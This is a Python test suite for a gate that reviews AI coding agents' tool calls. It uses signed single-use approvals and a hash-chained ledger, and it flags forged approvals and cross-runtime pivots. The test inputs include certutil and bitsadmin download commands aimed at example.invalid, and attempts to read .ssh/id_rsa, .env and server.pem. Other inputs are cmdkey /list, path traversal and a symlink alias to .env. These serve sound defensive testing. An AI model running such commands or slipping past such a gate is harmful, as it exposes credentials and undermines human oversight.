"""Inert boundary tests: no proposed command is ever executed."""
import base64
import json
from pathlib import Path
import sys
import tempfile
import time
import unittest
from concurrent.futures import ThreadPoolExecutor

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / ".guardian/engine"))
from gate import decide, token_valid  # noqa: E402
from issuer import append_decision  # noqa: E402
from ledger import LedgerError, canonical, locked  # noqa: E402


class GateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name).resolve()
        (self.root / ".guardian").mkdir()
        self.path = self.root / ".guardian/ledger.jsonl"
        self.path.touch()
        self.key = Ed25519PrivateKey.generate()
        config = json.loads((ROOT / ".guardian/policy.json").read_text())
        config["approval_public_key"] = self.key.public_key().public_bytes_raw().hex()
        self.public = config["approval_public_key"]
        (self.root / ".guardian/policy.json").write_text(json.dumps(config))
        (self.root / "input.txt").write_text("synthetic fixture")

    def payload(self, command="cat input.txt", session="session-a", tool="Bash"):
        return {"session_id": session, "cwd": str(self.root), "tool_name": tool,
                "tool_input": {"command": command}}

    def run_gate(self, payload=None, runtime="copilot"):
        return decide(payload or self.payload(), runtime, "cli", self.root)

    def approve(self, payload=None, runtime="copilot", decision="APPROVED"):
        payload = payload or self.payload()
        proposal = {"payload": payload, "runtime": runtime, "surface": "cli", "decision": decision,
                    "rationale": "Read the specific fixture needed for the requested edit",
                    "answers": {"command": payload["tool_input"].get("command") or canonical(payload["tool_input"]).decode(), "purpose": "Inspect fixture",
                                "necessity": "One explicit file is the minimum scope",
                                "impact": "Read one synthetic workspace file; failure returns no data"}}
        return append_decision(proposal, self.root, self.key)

    def test_unreviewed_file_command_denied_then_approved_once(self):
        denied = self.run_gate()
        self.assertEqual(denied["decision"], "IN_SCOPE")
        self.assertEqual(denied["rationale"], "Route this command through guardian first")
        self.approve()
        self.assertEqual(self.run_gate()["decision"], "APPROVED")
        self.assertEqual(self.run_gate()["decision"], "IN_SCOPE")

    def test_approval_binds_command_session_runtime_and_cwd(self):
        self.approve()
        for payload, runtime in [(self.payload("cp input.txt output.txt"), "copilot"),
                                 (self.payload(session="session-b"), "copilot"),
                                 (self.payload(), "claude")]:
            self.assertNotEqual(self.run_gate(payload, runtime)["decision"], "APPROVED")
        (self.root / "sub").mkdir()
        moved = self.payload()
        moved["cwd"] = str(self.root / "sub")
        self.assertNotEqual(self.run_gate(moved)["decision"], "APPROVED")

    def test_hard_denials_and_cross_runtime_pivot(self):
        first = self.run_gate(self.payload("certutil -urlcache https://example.invalid/x x"))
        self.assertEqual(first["decision"], "HARD_DENY")
        second = self.run_gate(self.payload("bitsadmin /transfer x https://example.invalid/x x"))
        self.assertEqual(second["decision"], "PIVOT_ATTEMPT")
        third = self.run_gate(self.payload("certutil -urlcache https://example.invalid/x x"), "codex")
        self.assertEqual(third["decision"], "PIVOT_ATTEMPT")
        self.assertTrue(third["pivot_flag"])

    def test_azure_identity_and_continuation_fail_closed(self):
        result = self.run_gate(self.payload("az account show"))
        self.assertEqual(result["decision"], "HARD_DENY")
        self.assertEqual(result["triggering_rule"], "IDENTITY_UNVERIFIED")
        for tool in ("write_stdin", "write_bash", "write_powershell", "Agent", "task"):
            self.assertIn(self.run_gate(self.payload("pwd", tool=tool))["decision"], {"HARD_DENY", "PIVOT_ATTEMPT"})

    def test_automatic_diagnostic_and_subagent_request(self):
        payload = self.payload("pwd")
        payload["agent_id"] = "synthetic-child"
        result = self.run_gate(payload)
        self.assertEqual(result["decision"], "AUTO_ALLOW")
        self.assertEqual(result["agent"], "synthetic-child")
        self.assertEqual(result["defender_verdict"], "not_observed")

    def test_expired_and_forged_tokens_rejected(self):
        now = time.time()
        token = {"request_hash": "x", "issued_at": now - 1000, "expires_at": now - 1,
                 "token_id": "fixture", "answers": dict.fromkeys(("command", "purpose", "necessity", "impact"), "x")}
        entry = {"decision": "APPROVAL_ISSUED", "token": token,
                 "signature": base64.b64encode(self.key.sign(canonical(token))).decode()}
        self.assertFalse(token_valid(entry, "x", self.public, now))
        token.update(issued_at=now, expires_at=now + 600)
        self.assertFalse(token_valid(entry, "x", self.public, now))
        self.assertFalse(token_valid(entry, "x", None, now))

    def test_plain_approved_line_is_not_authority(self):
        self.run_gate()
        with locked(self.path) as log:
            fake = dict(log.records[-1], decision="APPROVED")
            log.append(fake)
        self.assertEqual(self.run_gate()["decision"], "IN_SCOPE")

    def test_ledger_corruption_and_missing_file_deny(self):
        self.run_gate(self.payload("pwd"))
        self.path.write_bytes(self.path.read_bytes().replace(b"AUTO_ALLOW", b"AUTO_DENY"))
        # A changed last line requires an external checkpoint; append a next record first.
        with locked(self.path) as log:
            self.assertEqual(len(log.records), 1)
        self.path.write_bytes(b'{"previous_hash":"wrong"}\n')
        with self.assertRaises(LedgerError):
            self.run_gate()
        self.path.unlink()
        with self.assertRaises(LedgerError):
            self.run_gate()

    def test_chain_detects_previous_entry_modification(self):
        self.run_gate(self.payload("pwd"))
        self.run_gate(self.payload("pwd"))
        self.path.write_bytes(self.path.read_bytes().replace(b"AUTO_ALLOW", b"AUTO_DENY", 1))
        with self.assertRaises(LedgerError):
            self.run_gate()

    def test_atomic_concurrent_single_token_consumption(self):
        self.approve()
        with ThreadPoolExecutor(max_workers=4) as pool:
            results = list(pool.map(lambda _: self.run_gate(), range(4)))
        self.assertEqual(sum(r["decision"] == "APPROVED" for r in results), 1)
        with locked(self.path) as log:
            self.assertEqual(len(log.records), 5)

    def test_native_edit_token_and_sensitive_paths(self):
        payload = self.payload("", tool="Edit")
        payload["tool_input"] = {"file_path": "input.txt", "old_string": "fixture", "new_string": "data"}
        self.assertEqual(self.run_gate(payload)["decision"], "IN_SCOPE")
        self.approve(payload)
        self.assertEqual(self.run_gate(payload)["decision"], "APPROVED")
        payload["tool_input"]["new_string"] = "changed after review"
        self.assertEqual(self.run_gate(payload)["decision"], "IN_SCOPE")
        for path in ("../outside", ".guardian/policy.json", ".env", ".ssh/id_rsa"):
            payload["tool_input"]["file_path"] = path
            self.assertIn(self.run_gate(payload)["decision"], {"HARD_DENY", "PIVOT_ATTEMPT"})

    def test_reviewed_copy_and_patch_rename_destinations(self):
        payload = self.payload("cp input.txt output.txt")
        self.approve(payload)
        self.assertEqual(self.run_gate(payload)["decision"], "APPROVED")
        patch = "*** Begin Patch\n*** Update File: input.txt\n*** Move to: ../outside.txt\n@@\n-old\n+new\n*** End Patch"
        self.assertEqual(self.run_gate(self.payload(patch, tool="apply_patch"))["decision"], "HARD_DENY")

    def test_explicit_guardian_denial_cannot_be_reapproved_immediately(self):
        self.approve(decision="DENIED")
        self.approve()
        self.assertEqual(self.run_gate()["decision"], "PIVOT_ATTEMPT")

    def test_permission_hook_does_not_consume_twice(self):
        self.approve()
        self.assertEqual(self.run_gate()["decision"], "APPROVED")
        payload = self.payload()
        payload["_guardian_event"] = "permissionRequest"
        self.assertEqual(self.run_gate(payload)["decision"], "AUTO_ALLOW")
        self.assertEqual(self.run_gate()["decision"], "IN_SCOPE")

    def test_native_paths_and_workdir_cannot_hide_scope(self):
        for tool, fields in [("Grep", {"path": ".", "pattern": ".*"}),
                             ("Glob", {"path": ".", "pattern": "**/*"}),
                             ("Read", {"file_path": "server.pem"}),
                             ("Write", {"file_path": ".vscode/settings.json"})]:
            payload = self.payload(tool=tool, session=tool)
            payload["tool_input"] = fields
            self.assertEqual(self.run_gate(payload)["decision"], "HARD_DENY")
        payload = self.payload()
        payload["tool_input"]["workdir"] = str(self.root.parent)
        with self.assertRaises(ValueError):
            self.run_gate(payload)
        (self.root / ".env").write_text("SYNTHETIC_ONLY=value")
        try:
            (self.root / "alias.txt").symlink_to(self.root / ".env")
        except OSError:
            self.skipTest("Symlink creation unavailable")
        payload = self.payload(tool="Read")
        payload["tool_input"] = {"file_path": "alias.txt"}
        self.assertEqual(self.run_gate(payload)["decision"], "HARD_DENY")

    def test_invalid_protocol_and_four_answers(self):
        with self.assertRaises(ValueError):
            self.run_gate({"tool_name": "Bash", "tool_input": {"command": "pwd"}})
        with self.assertRaises(ValueError):
            self.approve(self.payload("cmdkey /list"))


if __name__ == "__main__":
    unittest.main()
